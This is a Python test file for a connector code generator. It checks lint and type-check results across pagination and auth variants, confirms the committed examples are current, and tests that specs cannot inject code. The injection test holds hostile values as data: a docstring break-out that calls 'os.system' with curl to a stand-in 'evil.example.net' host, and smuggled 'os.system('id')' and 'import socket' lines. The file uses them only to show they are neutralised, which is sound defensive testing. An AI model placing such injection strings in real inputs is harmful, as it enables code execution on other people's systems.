"""P6: generated code passes ruff and mypy --strict, and a spec can't inject code into it."""

from __future__ import annotations

import copy
from typing import Any

import pytest

from app.services.codegen import EXAMPLES, SpecRejectedError, check_code, module_name, render
from tests.conftest import base_spec, example_spec

PAGINATIONS: list[dict[str, Any]] = [
    {"type": "none"},
    {"type": "cursor", "request_param": "after", "next_cursor_path": "next", "has_more_path": "more"},
    {"type": "next_url", "next_url_path": "links.next"},
    {"type": "link_header"},
    {"type": "offset_limit", "offset_param": "offset", "limit_param": "limit", "limit": 100},
    {"type": "page_number", "page_param": "page", "start": 1},
]


@pytest.mark.parametrize("app", ["calendly", "zendesk", "notion"])
def test_example_connectors_pass_ruff_and_mypy_strict(app: str) -> None:
    result = check_code(render(example_spec(app), 1), f"{app}_v1")
    assert result.ok, f"{result.ruff}\n{result.mypy}"


def test_every_paginator_and_auth_type_passes_ruff_and_mypy_strict() -> None:
    specs = [base_spec(pagination=p) for p in PAGINATIONS]
    basic = base_spec()
    basic["auth"] = {**basic["auth"], "type": "basic", "basic_username": "{secrets.token}", "basic_password": "x"}
    del basic["auth"]["bearer_template"]
    header = base_spec()
    header["auth"] = {
        **header["auth"],
        "type": "api_key_header",
        "header_name": "X-Api-Key",
        "value_template": "{secrets.token}",
    }
    del header["auth"]["bearer_template"]
    # One module per variant, checked together keeps mypy fast enough.
    for i, spec in enumerate([*specs, basic, header]):
        result = check_code(render(spec, 1), f"variant_{i}")
        assert result.ok, f"variant {i}\n{result.ruff}\n{result.mypy}"


def test_committed_examples_are_up_to_date() -> None:
    for app in ("calendly", "zendesk", "notion"):
        spec = example_spec(app)
        committed = (EXAMPLES / f"{module_name(spec, 1)}.py").read_text()
        assert committed == render(spec, 1), f"run: python -m app.services.codegen ({app})"


def test_invalid_spec_is_never_rendered() -> None:
    spec = example_spec("calendly")
    spec["streams"]["users"]["method"] = "DELETE"
    with pytest.raises(SpecRejectedError, match="RULES_REJECTED"):
        render(spec, 1)


def test_spec_text_cannot_inject_code() -> None:
    spec = example_spec("calendly")
    evil = 'x"""\nimport os; os.system("curl evil.example.net")\n#'
    spec["auth"]["scopes"] = ["users:read\nimport os\nos.system('id')"]
    spec["app"]["tier_reason"] = evil
    spec["usage_definition"]["metric_label"] = "Meetings\nimport socket"
    code = render(copy.deepcopy(spec), 1)
    executable = [line for line in code.splitlines() if not line.lstrip().startswith("#")]
    assert not any(line.strip().startswith(("import os", "import socket", "os.system")) for line in executable)
    assert "import os" not in code.split('"""', 2)[2].split("# 1. API client")[0]
    assert check_code(code, "evil").ok
